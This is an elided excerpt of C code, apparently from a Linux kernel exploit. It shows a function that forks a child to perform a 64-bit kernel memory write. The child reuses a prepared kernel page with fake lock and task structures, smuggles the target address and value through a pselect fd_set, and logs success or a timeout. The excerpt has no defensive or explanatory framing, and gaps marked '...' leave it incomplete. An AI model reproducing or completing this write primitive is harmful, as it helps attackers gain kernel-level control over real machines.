...
static int direct_pselect_write_once_internal(
  ...
  if (child == 0) {
    ...
    if (!page_reuse_active) {
      ...
      /* Reuse mode: kernel page already prepared by parent.
       * fake_lock/fake_w0/fake_task are inherited via fork.
       * Per-write target/value goes into the pselect fd_set (userspace stack),
         * NOT into the kernel page payload. */
      if (!page_base || !fake_lock || !fake_w0 || !fake_task) {
        pr_warning("direct-w64[%d] reuse but page not prepared "
                   "base=%016zx lock=%016zx w0=%016zx task=%016zx\n",
                   idx, page_base, fake_lock, fake_w0, fake_task);
        _exit(12);
      }
    }

    pr_success("direct-w64[%d] target=%016zx value=%016zx shape=%d "
               "workspace=%016zx reuse=%d\n",
               idx, target, value, shape, page_base, page_reuse_active);
  ...
  uint64_t deadline =
      monotonic_ms() + timeout_sec * 1000ULL;
  int status = 0;
  for (;;) {
    ...
    if (monotonic_ms() >= deadline) {
      pr_warning("direct-w64[%d] timeout child=%d seconds=%llu reuse=%d\n",
                 idx, child, (unsigned long long)timeout_sec,
                 page_reuse_active);
      kill_and_reap_group(child);
      errno = ETIMEDOUT;
      return 0;
